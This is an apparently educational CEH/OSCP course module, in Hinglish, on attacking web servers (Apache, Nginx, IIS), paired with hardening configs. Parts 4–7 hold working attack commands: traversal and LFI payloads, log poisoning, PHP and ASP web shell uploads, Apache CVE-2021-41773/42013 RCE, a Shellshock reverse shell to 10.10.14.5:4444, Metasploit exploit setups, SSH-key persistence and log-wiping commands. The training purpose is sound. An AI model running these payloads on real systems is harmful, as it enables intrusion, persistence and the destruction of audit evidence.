# **Penetration Testing Masterclass: Module 13 — Hacking Web Servers**

> **Curricular Mapping:** EC-Council CEH (Exam 312-50) Module 13 | CEH Practical | OSCP Infrastructure Track  
> **Target Skillset:** Web Server Architecture Internals, Advanced Fingerprinting, Nikto Mechanics, Path Traversal & Log Poisoning, WebDAV Abuse, Apache/IIS Kernel CVEs, Metasploit Suite, and CIS Benchmark Hardening.

---

## **📌 Fundamental Boundary: Web Server Hacking vs. Web Application Hacking**

Exam point of view aur real-world Red Teaming dono ke liye ye line crystal clear honi chahiye:

[ Client Request ] ───> [ Reverse Proxy / WAF ] ───> [ Web Server Daemon ] ───> [ Runtime / App Code ] ───> [ Database ]

                                                      │ (Apache / Nginx / IIS)│  │ (PHP, Node, Python, Java) │

                                                      └──────────┬────────────┘  └──────────────┬─────────────┘

                                                                 │                              │

                                                      [ MODULE 13 TARGET ]           [ MODULE 14 TARGET ]

                                                      - Daemon Architecture          - SQL Injection / XSS

                                                      - Config & Permissions         - CSRF / SSRF / IDOR

                                                      - Kernel Drivers (HTTP.sys)    - Broken Access Control

                                                      - HTTP Parsing & Verb Tamper   - Business Logic Flaws

- **Web Server Hacking (Module 13):** Attack target _underlying server software_, operating system socket handlers, daemon process models, default configurations, service isolation, aur host permissions hote hain. Ek server-level compromise direct OS command execution aur complete infrastructure takeover deta hai.
- **Web Application Hacking (Module 14):** Attack target application logic, database query concatenation, session state models, aur input validation flaws hote hain.

---

## **PART 1: Architectural Foundations & Process Isolation Models**

### **1.1 Apache HTTP Server (httpd) Multi-Processing Modules (MPM)**

Apache incoming network connections handle karne ke liye specialized execution engines use karta hai:

|MPM Engine|Process Model|Concurrency & Memory Trade-off|Security Implication|
|---|---|---|---|
|**Prefork**|Non-threaded. 1 Master process forks isolated child processes. Har connection ke liye 1 process.|Heavy RAM consumption. Thread-safe (PHP module support).|Ek process crash hone se doosre clients affect nahi hote, lekin Slowloris DoS ke samne extremely vulnerable.|
|**Worker**|Hybrid multi-process, multi-threaded. Har child process fixed threads spawn karta hai.|Low RAM overhead, high throughput. Requires thread-safe modules.|Thread safety issues; shared memory space inside child processes.|
|**Event**|Asynchronous worker architecture. Dedicated listener thread Keep-Alive connections handle karta hai.|Ultra-high performance, lowest latency, minimal resource lock.|Complex event queues; worker thread state exploitation.|

#### **Critical Apache Directives & Misconfiguration Hazards:**

- **`AllowOverride All` Risk:** Agar global document root par enabled ho, toh attackers web directories me uploaded `.htaccess` files execute karke arbitrary PHP handlers enable kar sakte hain:
    
    apache
    
    # Malicious .htaccess to execute .png as PHP
    
    AddType application/x-httpd-php .png
    
- **`mod_userdir` Risk:** `~username` mappings enable karta hai (`http://target.com/~root/` ya `/~admin/`). User enumeration aur home directory traversal attack surface create karta hai.
- **`mod_status` Exposure:** Agar `/server-status` endpoint public ho (`Require all granted`), attacker real-time client IP addresses, current vhosts, internal URLs, aur unauthenticated session tokens monitor kar sakta hai.

---

### **1.2 Nginx Architecture: Asynchronous Epoll & The "Off-by-Slash" Traversal**

Nginx event-driven, asynchronous model par chalta hai jahan single master process non-blocking `epoll` (Linux) / `kqueue` (BSD) system calls ke through hazaron concurrent requests handle karta hai.

#### **The Infamous Nginx "Off-by-Slash" Path Traversal:**

Jab reverse proxy configuration me `location` block ke end me trailing slash `/` missing ho, lekin `alias` directive me slash ho:

nginx

# VULNERABLE CONFIGURATION

location /files {

    alias /var/www/static/;

}

- **Exploitation Mechanism:** Request: `GET /files../app/config.py HTTP/1.1`  
    Nginx path ko internally normalize karta hai: `/var/www/static/` + `../app/config.py` ⟶\longrightarrow⟶ `/var/www/app/config.py`.
- **Remediation:** Dono path directives ko slash structure ke sath match karo:
    
    nginx
    
    location /files/ {
    
        alias /var/www/static/;
    
    }
    

---

### **1.3 Microsoft IIS: Kernel Drivers, AppPools & Pipelines**

- **`HTTP.sys` (Kernel Mode Listener):** `C:\Windows\System32\drivers\http.sys` directly Ring 0 me operate karta hai. Incoming TCP 80/443 packets ko intercept karta hai, SSL termination handle karta hai, aur requests ko user-mode application queues me dispatch karta hai. User-mode processes tak pahuche bina memory corruption yahan execute ho sakti hai (e.g., MS15-034).
- **`w3wp.exe` Worker Processes:** User-mode worker processes jo configured Application Pools (`AppPools`) ke andar execute hote hain.
    - Default Identity: `IIS APPPOOL\DefaultAppPool` (Virtual Account, low privilege).
    - Misconfiguration: Production environments me agar AppPool ko `LocalSystem`, `NetworkService`, ya high-privileged domain service account par switch kiya gaya ho, toh simple shell upload direct domain compromise ban jata hai.
- **Pipeline Modes:**
    - _Classic Mode:_ IIS 6 legacy model — ISAPI extensions alag pipeline me execute hoti hain.
    - _Integrated Mode:_ Managed .NET code aur native HTTP modules single unified pipeline share karte hain. Attack surface modules (jaise WebDAV, custom HTTP filters) direct pipeline level par intercept karte hain.

---

## **PART 2: Web Server Footprinting & Deep Fingerprinting**

[ Target Domain ]

      │

      ├──> Passive OSINT (Shodan, Censys, SecurityTrails, GHDB)

      │

      ├──> Banner Grabbing (curl, netcat, telnet) ───> [ Raw Server Strings ]

      │

      └──> Active Heuristic Fingerprinting (HTTPrint, Nmap NSE)

            ├── HTTP Header Ordering

            ├── Header Capitalization Quirks

            └── Malformed Verb Response Codes (e.g., DELETE / HTTP/1.0 -> 405 vs 501)

### **2.1 OSINT & Active Banner Grabbing Commands**

#### **cURL Banner Retrieval (Protocol Tracing):**

bash

# Full header trace, unbuffered output

curl -I -s -L https://target-corp.com

# Verbose negotiation showing TLS handshake + ALPN protocols

curl -v -X HEAD https://target-corp.com 2>&1 | grep -E "(Server:|X-Powered-By:|X-AspNet-Version:)"

#### **Raw Netcat Banner Query:**

bash

printf "HEAD / HTTP/1.1\r\nHost: target-corp.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n" | nc -vn 192.168.1.50 80

---

### **2.2 Deep Heuristic Fingerprinting: HTTPrint & Header Signature Mechanics**

Jab production servers banners mask kar dete hain (e.g., `Server: Apache` ko badalkar `Server: Unknown Gateway` kar diya gaya ho), tab signature engines jaise **HTTPrint**, **HTTPRecon**, aur **ID Serve** low-level protocol behavioral quirks analyse karte hain:

1. **HTTP Header Serialization Ordering:** Apache headers ko ek specific deterministic order me serialize karta hai (`Date` →\rightarrow→ `Server` →\rightarrow→ `Content-Length`), jabki IIS aur Nginx alag order use karte hain.
2. **Case Sensitivity & Capitalization:** IIS outputs `Content-Length:`, Apache outputs `Content-length:` ya spacing quirks.
3. **Status Codes on Non-Standard/Malformed HTTP Verbs:**
    - Sending `FOOBAR / HTTP/1.1`:
        - Apache returns: `501 Method Not Implemented`
        - IIS returns: `405 Method Not Allowed` ya `501 Not Implemented` depending on pipeline
        - Nginx returns: `400 Bad Request` or `405 Not Allowed`

#### **HTTPrint Execution:**

bash

# Analyze target web server against signature database

httprint -h http://192.168.1.50 -s /usr/share/httprint/signatures.txt -P0

---

### **2.3 Nmap Web Server NSE Suite**

bash

# Comprehensive Web Server Enumeration Suite

nmap -p 80,443,8080 -sV \

  --script=http-server-header,http-methods,http-enum,http-trace,http-webdav-scan,http-headers \

  192.168.1.50

- `--script=http-methods`: Supported HTTP verbs enumerate karta hai (OPTIONS probing).
- `--script=http-enum`: Common paths, management consoles (cPanel, phpMyAdmin), aur test directories brute-force karta hai.
- `--script=http-trace`: Cross-Site Tracing (XST) verify karne ke liye TRACE verb test karta hai.

---

## **PART 3: Vulnerability Scanning Mechanics with Nikto**

Nikto ek specialized open-source web server scanner hai jo over 6700+ dangerous files/programs, outdated daemon versions, server configuration items, aur host architecture flaws test karta hai.

### **3.1 Nikto Tuning Reference Table (`-Tuning`)**

CEH Exam aur practical assessments ke liye Nikto ke exact `-Tuning` flags yaad hone mandatory hain:

|Tuning ID|Test Category & Vulnerability Scope|Real-World Attack Focus|
|---|---|---|
|**`0`**|File Upload (Insecure upload scripts)|Malicious arbitrary extension uploads|
|**`1`**|Interesting Files / Data Dumps|`.sql`, `.bak`, `.zip`, `.tar.gz`, dump files|
|**`2`**|Misconfigurations / Default Files|Default welcome pages, server manual docs|
|**`3`**|Information Disclosure|Server info leaks, stack traces, paths|
|**`4`**|Injection (XSS / Script / Parameter)|Server-level script reflections|
|**`5`**|Remote File Retrieval (LFI / Path Traversal)|`../../etc/passwd`, sensitive reads|
|**`6`**|Denial of Service (Command execution DoS)|Server resource exhaustion paths|
|**`7`**|Remote File Retrieval (Server wide)|Traversal across system roots|
|**`8`**|Command Execution / Remote Shells|Web shells, backdoors, CGI scripts|
|**`9`**|SQL Injection|Root-level database injection probes|
|**`a`**|Authentication Bypass|Unauthorized admin endpoint access|
|**`b`**|Software Identification|Outdated patch/daemon versioning|
|**`c`**|Remote Source Inclusion|RFI file inclusions|
|**`x`**|Reverse Tuning (Exclude options)|Example: `-Tuning x4` (all except XSS)|

---

### **3.2 Nikto IDS/IPS Evasion Directives (`-evasion`)**

|Evasion ID|Evasion Technique Description|
|---|---|
|**`1`**|Random URI encoding (non-UTF8)|
|**`2`**|Directory self-reference (`/./`) injection|
|**`3`**|Premature URL ending|
|**`4`**|Prepend long random strings to URI|
|**`5`**|Fake parameter injection|
|**`6`**|TAB character as request spacer|
|**`7`**|Change the case of the URL (Windows IIS targets)|
|**`8`**|Use Windows directory separator (`\`) instead of standard `/`|
|**`A`**|Carriage Return (`%0d`) request line injection|
|**`B`**|Binary Value `0x0b` (Vertical Tab) injection|

---

### **3.3 Nikto Practical Command Workflows**

bash

# 1. Full Production Assessment through Burp Suite Proxy (Port 8080)

nikto -h http://192.168.1.50 -useproxy http://127.0.0.1:8080 -C all

# 2. Targeted Tuning: Interesting Files (1), Misconfigurations (2), Remote Shells (8)

nikto -h 192.168.1.50 -p 80,443 -Tuning 128 -output /tmp/nikto_scan.html -Format htm

# 3. Evasion-Enabled Scan against IIS Server (Directory self-ref + Windows slash)

nikto -h 192.168.1.50 -evasion 28 -Tuning 23b

# 4. Multi-Host Automated Batch Scan via Target List

nikto -h target_webservers.txt -Format xml -output /root/reports/batch_audit.xml

---

## **PART 4: EC-Council 8-Phase Web Server Attack Methodology**

EC-Council CEH formal framework 8 distinct sequential phases define karta hai:

[ Phase 1: Information Gathering ]

       │  (Whois, DNS records, Netcraft, Sublist3r)

       ▼

[ Phase 2: Web Server Footprinting ]

       │  (Banner grabbing, HTTPrint, Nmap -sV, SSL ciphers)

       ▼

[ Phase 3: Website Mirroring ]

       │  (Wget, HTTrack, offline source code/comment inspection)

       ▼

[ Phase 4: Web Server Vulnerability Scanning ]

       │  (Nikto, OpenVAS/Greenbone, Nessus, NSE scripts)

       ▼

[ Phase 5: Session Hijacking ]

       │  (Cookie spoofing, AiTM proxies, TCP session hijack)

       ▼

[ Phase 6: Web Server Password Cracking ]

       │  (Hydra HTTP-auth, SSH/FTP brute force, credential stuffing)

       ▼

[ Phase 7: Privilege Escalation & Shells ]

       │  (Web shell injection, OS kernel exploit, Token stealing)

       ▼

[ Phase 8: Maintaining Access & Covering Tracks ]

          (Cron backdoors, SSH authorized_keys, Log wiping)

### **Phase 3 Deep-Dive: Website Mirroring Commands**

Source code ko offline clone karke hardcoded credentials, developer comments, internal staging API paths, aur hidden endpoints identify kiye jaate hain:

bash

# HTTrack Mirroring Command

httrack "http://target-corp.com" -O "/opt/recon/target_mirror" \

  "+*.target-corp.com/*" -v --connection-per-second=5

# Wget Recursive Mirror (Clones assets, converts links for offline viewing)

wget --mirror --convert-links --adjust-extension --page-requisites \

  --no-parent --user-agent="Mozilla/5.0" http://target-corp.com/

---

### **Phase 7 Deep-Dive: Directory Traversal, LFI/RFI & Log Poisoning**

#### **1. Path Traversal & Canonicalization Bypasses:**

bash

# Standard Traversal

curl "http://192.168.1.50/view.php?file=../../../../etc/passwd"

# 16-bit Unicode Encoding Bypass (IIS legacy)

curl "http://192.168.1.50/view.php?file=..%u002e/..%u002e/boot.ini"

# Double URL Encoding Bypass

curl "http://192.168.1.50/view.php?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"

# Overlong UTF-8 Encoding

curl "http://192.168.1.50/view.php?file=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"

#### **2. Local File Inclusion (LFI) via PHP Wrappers:**

bash

# Base64 Filter Wrapper (Source code exfiltration without server-side execution)

curl "http://192.168.1.50/index.php?page=php://filter/convert.base64-encode/resource=config.php"

# Data Wrapper (Remote Code Execution if allow_url_include is ON)

curl "http://192.168.1.50/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id"

#### **3. Apache Access Log Poisoning Execution:**

Jab target application par LFI vulnerability ho, lekin RFI disabled ho:

[ Attacker ] ──( 1. Injects PHP code into User-Agent )──> [ Apache Web Server ]

                                                                   │

                                                ( Writes payload to /var/log/apache2/access.log )

                                                                   │

[ Attacker ] ──( 2. Requests LFI targeting access.log )────────────▼

                  `page=/var/log/apache2/access.log&cmd=whoami`

                               │

                               ▼

               [ Code Executes as www-data ]

bash

# Step 1: Inject PHP payload via User-Agent header into access log

nc -vn 192.168.1.50 80

GET / HTTP/1.1

Host: 192.168.1.50

User-Agent: <?php system($_GET['c']); ?>

Connection: close

# Step 2: Trigger execution via LFI parameter

curl "http://192.168.1.50/index.php?page=/var/log/apache2/access.log&c=id"

---

### **Phase 7 Deep-Dive: HTTP Verb Tampering & WebDAV Exploitation**

#### **HTTP Verb Tampering:**

Agar server authorization check me sirf `GET` aur `POST` restrict kiya gaya ho, toh attackers verbs manipulate karte hain:

bash

# Probing allowed verbs via OPTIONS

curl -X OPTIONS -v http://192.168.1.50/admin/

# Verb Tampering attempt using HEAD

curl -I -X HEAD http://192.168.1.50/admin/dashboard.php

# Arbitrary File Upload via insecure HTTP PUT

curl -X PUT http://192.168.1.50/uploads/shell.php -d "<?php system(\$_GET['cmd']); ?>"

#### **WebDAV (Distributed Authoring and Versioning) Exploitation:**

WebDAV users ko remote web documents manage aur edit karne deta hai. Misconfigured WebDAV servers direct arbitrary file upload allow karte hain:

bash

# 1. Test WebDAV access and enabled methods with DavTest

davtest -url http://192.168.1.50/webdav/ -auth user:password

# 2. Uploading via Cadaver CLI Client

cadaver http://192.168.1.50/webdav/

dav:/webdav/> put /opt/payloads/cmd.asp

dav:/webdav/> copy cmd.asp shell.asp;.txt

dav:/webdav/> exit

# 3. Direct curl WebDAV file movement bypass (.txt -> .asp)

curl -X PUT http://192.168.1.50/webdav/payload.txt -d '<%eval request("cmd")%>'

curl -X MOVE -H "Destination: http://192.168.1.50/webdav/payload.asp" http://192.168.1.50/webdav/payload.txt

---

## **PART 5: High-Impact Web Server CVEs & Kernel Exploits**

### **5.1 Apache HTTP Server Path Traversal & RCE (CVE-2021-41773 & CVE-2021-42013)**

- **Vulnerable Versions:** Apache HTTP Server 2.4.49 (CVE-2021-41773) aur 2.4.50 (incomplete patch CVE-2021-42013).
- **Flaw Mechanism:** `ap_normalize_path()` function URL paths ko decode karne se pehle validation perform karta tha. Attacker dot-dot-slash sequence ko double-encode (`.%2e/` ya `.%%32%65/`) karke DocumentRoot boundary escape kar sakta tha. Agar `mod_cgi` enabled tha, toh arbitrary binary execution possible thi.

#### **Proof of Concept Verification (LFI & RCE):**

bash

# CVE-2021-41773: Arbitrary File Read (/etc/passwd)

curl -s --path-as-is -d "echo" "http://192.168.1.50/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# CVE-2021-42013 (Bypass patch): Remote Code Execution via mod_cgi

curl -s --path-as-is -d "echo; id" \

  "http://192.168.1.50/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"

---

### **5.2 Shellshock: Bash Environment Variable Injection (CVE-2014-6271)**

- **Vulnerable Component:** GNU Bash ≤\le≤ 4.3 executing behind Apache CGI (`mod_cgi` / `mod_cgid`).
- **Flaw Mechanism:** Jab Apache incoming HTTP headers (`User-Agent`, `Referer`, `Cookie`) ko environment variables ke roop me export karta hai, Bash trailing function definitions `() { :; };` ko parse karne ke baad trailing commands execute kar deta hai.

bash

# Manual Shellshock RCE Probe via User-Agent Header

curl -H "User-Agent: () { :; }; /bin/bash -c 'id; uname -a'" \

  http://192.168.1.50/cgi-bin/status.cgi

# Reverse Shell Payload via Shellshock

curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" \

  http://192.168.1.50/cgi-bin/test.cgi

---

### **5.3 Microsoft IIS / HTTP.sys Range Header Integer Overflow (MS15-034 / CVE-2015-1635)**

- **Vulnerable Component:** Windows 7, Windows Server 2008 R2, Windows 8, Windows Server 2012 kernel driver `HTTP.sys`.
- **Flaw Mechanism:** Jab attacker craft kiya hua HTTP `Range` header bhejta hai jisme extreme 64-bit integer values hoti hain, `HTTP.sys` cache parsing routine integer overflow hit karta hai, leading to kernel memory leak or instant Blue Screen of Death (BSOD).

bash

# Verification Probe (Safe Detection without crashing)

# If vulnerable, server responds with: "HTTP/1.1 416 Requested Range Not Satisfiable"

curl -v http://192.168.1.50/ -H "Host: 192.168.1.50" -H "Range: bytes=0-18446744073709551615"

---

### **5.4 Microsoft IIS 6.0 WebDAV ScStoragePathFromUrl RCE (CVE-2017-7269)**

- **Vulnerable Component:** Windows Server 2003 R2 running IIS 6.0 with WebDAV enabled.
- **Flaw Mechanism:** Buffer overflow in `ScStoragePathFromUrl` function inside `httpext.dll` when processing malformed `IF` headers in `PROPFIND` requests.

bash

# Verification via Nmap NSE script

nmap -p 80 --script http-iis-webdav-vuln 192.168.1.50

---

## **PART 6: Metasploit Framework Web Server Exploitation Suite**

### **6.1 Essential Auxiliary Enumeration Modules**

text

# Launch MSF Console

msfconsole -q

#### **1. Version & Fingerprint Scanner:**

text

use auxiliary/scanner/http/http_version

set RHOSTS 192.168.1.0/24

set THREADS 10

run

#### **2. High-Performance Directory Brute-Forcer:**

text

use auxiliary/scanner/http/dir_scanner

set RHOSTS 192.168.1.50

set PATH /

set DICTIONARY /usr/share/wordlists/dirb/common.txt

run

#### **3. Apache Userdir Enumeration:**

text

use auxiliary/scanner/http/apache_userdir_enum

set RHOSTS 192.168.1.50

set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt

run

#### **4. WebDAV Scanner & Unicode Bypass:**

text

use auxiliary/scanner/http/webdav_scanner

set RHOSTS 192.168.1.50

run

use auxiliary/scanner/http/dir_webdav_unicode_bypass

set RHOSTS 192.168.1.50

run

#### **5. HTTP Verb Authentication Bypass:**

text

use auxiliary/scanner/http/verb_auth_bypass

set RHOSTS 192.168.1.50

set TARGETURI /admin/

run

---

### **6.2 Exploitation Modules**

#### **Apache mod_cgi Shellshock RCE:**

text

use exploit/multi/http/apache_mod_cgi_bash_env_exec

set RHOSTS 192.168.1.50

set TARGETURI /cgi-bin/stats.cgi

set LHOST 10.10.14.5

set LPORT 4444

set PAYLOAD linux/x86/meterpreter/reverse_tcp

check

exploit

#### **IIS WebDAV ASP File Upload Exploitation:**

text

use exploit/windows/iis/iis_webdav_upload_asp

set RHOSTS 192.168.1.50

set PATH /webdav/

set HttpUsername testuser

set HttpPassword Password123

set LHOST 10.10.14.5

set LPORT 443

exploit

---

## **PART 7: DNS Infrastructure Attacks & Server Defacement**

                    [ 1. DNS Amplification Attack ]

[ Compromised Botnet ] ──( Spoofed ANY queries )──> [ Open Resolvers ] ──( 50x-70x traffic )──> [ Web Server DoS ]

                    [ 2. DNS Server Hijacking ]

[ Attacker ] ──( Compromises Registrar / BIND Zone )──> [ Points A-Record to Rogue IP ] ──> [ Defaced Website ]

### **7.1 DNS Hijacking vs. DNS Amplification**

- **DNS Server Hijacking:** Attacker authoritative DNS zone files compromise karta hai ya domain registrar access grab karta hai. Domain ka A-record attacker-controlled IP par point kar diya jata hai. Target server ka content deface ho jata hai aur traffic harvest hoti hai.
- **DNS Amplification Attack:** Distributed denial-of-service vector jahan attacker target web server ka IP address spoof karke hazaron open recursive DNS resolvers ko `EDNS0` large response queries (`type ANY` ya `type TXT`) bhejta hai. Resolvers target web server par 50x se 70x size ka volumetric traffic dump karte hain, taking the daemon offline.

---

### **7.2 Web Server Defacement & Post-Exploitation Persistence**

Target compromise hone ke baad attackers access maintain karne aur footprint leave karne ke liye standardized patterns use karte hain:

1. **Web Shell Staging:** Obfuscated single-line shells legitimate assets me hide kiye jaate hain:
    
    php
    
    <?php @eval($_POST['auth_token']); ?>
    
2. **SSH Authorized Keys Injection:** Root ya unprivileged user directory me persistence:
    
    bash
    
    echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... attacker@c2" >> ~/.ssh/authorized_keys
    
    chmod 600 ~/.ssh/authorized_keys
    
3. **Log Sanitization (Covering Tracks):**
    
    bash
    
    # Wiping specific attacker IP from Apache logs without zeroing file
    
    sed -i '/10\.10\.14\.5/d' /var/log/apache2/access.log
    
    sed -i '/10\.10\.14\.5/d' /var/log/apache2/error.log
    
    # Clearing bash history
    
    unset HISTFILE
    
    history -c
    

---

## **PART 8: Enterprise Hardening & CIS Configuration Blueprints**

Production web servers ko audit aur secure karne ke liye industry-standard CIS (Center for Internet Security) configurations implement karni hoti hain.

### **8.1 Apache Production Hardening (`/etc/apache2/conf-available/security.conf`)**

apache

# 1. Suppress Server Tokens and Version Signatures

ServerTokens Prod

ServerSignature Off

# 2. Disable TRACE Verb (Prevent Cross-Site Tracing XST)

TraceEnable Off

# 3. Secure Global Directory Permissions (Disable Indexing & Symlink traversal)

<Directory />

    AllowOverride None

    Require all denied

</Directory>

<Directory /var/www/html>

    Options -Indexes -FollowSymLinks +SymLinksIfOwnerMatch

    AllowOverride None

    Require all granted

</Directory>

# 4. Mandatory Defensive HTTP Security Headers

Header always set X-Frame-Options "DENY"

Header always set X-Content-Type-Options "nosniff"

Header always set X-XSS-Protection "1; mode=block"

Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';"

Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"

Header always set Referrer-Policy "strict-origin-when-cross-origin"

---

### **8.2 Nginx Hardening Configuration (`/etc/nginx/nginx.conf`)**

nginx

http {

    # 1. Hide Nginx Version Numbers

    server_tokens off;

    # 2. Prevent Buffer Overflow & Large Header Attacks

    client_body_buffer_size 10K;

    client_header_buffer_size 1k;

    client_max_body_size 8m;

    large_client_header_buffers 2 1k;

    # 3. Connection Rate Limiting (Mitigate Slowloris / Brute Force)

    limit_req_zone $binary_remote_addr zone=req_limit:10m rate=10r/s;

    limit_conn_zone $binary_remote_addr zone=conn_limit:10m;

    server {

        listen 80 default_server;

        server_name target-corp.com;

        return 301 https://$host$request_uri;

    }

    server {

        listen 443 ssl http2;

        server_name target-corp.com;

        # TLS Configuration

        ssl_protocols TLSv1.2 TLSv1.3;

        ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384;

        ssl_prefer_server_ciphers off;

        # Security Headers

        add_header X-Frame-Options "SAMEORIGIN" always;

        add_header X-Content-Type-Options "nosniff" always;

        add_header X-XSS-Protection "1; mode=block" always;

        add_header Content-Security-Policy "default-src 'self';" always;

        location / {

            # Disable Directory Indexing

            autoindex off;

            limit_req zone=req_limit burst=20 nodelay;

            limit_conn conn_limit 20;

        }

        # Block direct access to hidden files (.git, .env, .htaccess)

        location ~ /\. {

            deny all;

            access_log off;

            log_not_found off;

        }

    }

}

---

### **8.3 Microsoft IIS Hardening (`web.config`)**

xml

<?xml version="1.0" encoding="UTF-8"?>

<configuration>

    <system.webServer>

        <!-- 1. Remove Identifying Server Headers -->

        <httpProtocol>

            <customHeaders>

                <remove name="X-Powered-By" />

                <add name="X-Frame-Options" value="DENY" />

                <add name="X-Content-Type-Options" value="nosniff" />

                <add name="Strict-Transport-Security" value="max-age=31536000; includeSubDomains" />

            </customHeaders>

        </httpProtocol>

        <!-- 2. Request Filtering: Block Unsafe HTTP Verbs -->

        <security>

            <requestFiltering>

                <verbs allowUnlisted="false">

                    <add verb="GET" allowed="true" />

                    <add verb="POST" allowed="true" />

                    <add verb="HEAD" allowed="true" />

                </verbs>

                <!-- Block hidden segments and configuration files -->

                <hiddenSegments>

                    <add segment="web.config" />

                    <add segment="bin" />

                </hiddenSegments>

            </requestFiltering>

        </security>

    </system.webServer>

</configuration>

---

## **PART 9: Hands-on Lab Mapping & Exam Review**

### **9.1 Hands-on Practice Targets**

- **Metasploitable 2 & 3:** Apache Tomcat manager brute-forcing, WebDAV PUT execution, Shellshock vulnerability testing (`/cgi-bin/`).
- **TryHackMe / Hack The Box Labs:**
    - Room: **"Attacktive Directory" / "Metasploit Intro"** (HTTP scanners).
    - Room: **"Vulnversity"** (Upload bypass via extension manipulation).
    - Room: **"Internal" / "Blue"** (Kernel-level protocol testing).
- **DVWA (Damn Vulnerable Web App):** File Inclusion (LFI to RCE via log poisoning).

### **9.2 CEH Exam (312-50) & Practical Traps**

1. **Nikto Question:** _"Which flag in Nikto is used to scan for interesting files like backup archives?"_  
    →\rightarrow→ Answer: `-Tuning 1`.
2. **Fingerprinting Question:** _"Which tool analyzes HTTP header ordering and capitalization to determine web server OS when the banner is stripped?"_  
    →\rightarrow→ Answer: `HTTPrint` (ya `HTTPRecon`).
3. **Attack Classification:** Agar question me pucha jaye ki attacker ne directory traversal se `/etc/passwd` download kar liya ya Shellshock run kar diya, toh ye **Web Server Hacking** me classify hota hai ya **Web Application Hacking** me?  
    →\rightarrow→ Answer: **Web Server Hacking** (underlying daemon process / environment flaw).
4. **Methodology Order:** Remember the sequence: _Footprinting →\rightarrow→ Mirroring →\rightarrow→ Vulnerability Scanning →\rightarrow→ Exploitation/PrivEsc →\rightarrow→ Maintaining Access_.

---

## **🗺️ Master Certification Roadmap Progress**

|Mod #|Module Title|Status|
|---|---|---|
|01|Introduction to Ethical Hacking|✅ Complete|
|02|Footprinting and Reconnaissance|✅ Complete|
|03|Scanning Networks|✅ Complete|
|04|Enumeration|✅ Complete|
|05|Vulnerability Analysis|✅ Complete|
|06|System Hacking|✅ Complete|
|07|Malware Threats|✅ Complete|
|08|Sniffing|✅ Complete|
|09|Social Engineering|✅ Complete|
|10|Denial-of-Service|✅ Complete|
|11|Session Hijacking|✅ Complete|
|12|Evading IDS, Firewalls, and Honeypots|✅ Complete|
|**13**|**Hacking Web Servers**|**✅ COMPLETE**|
|14|**Hacking Web Applications (SQLi, XSS, CSRF, SSRF, IDOR, Web API OWASP)**|⏳ **NEXT IN QUEUE**|
|15|SQL Injection (Advanced Deep-Dive)|⏸️ Pending|
|16|Hacking Wireless Networks|⏸️ Pending|
|17|Hacking Mobile Platforms|⏸️ Pending|
|18|IoT and OT Hacking|⏸️ Pending|
|19|Cloud Computing|⏸️ Pending|
|20|Cryptography|⏸️ Pending|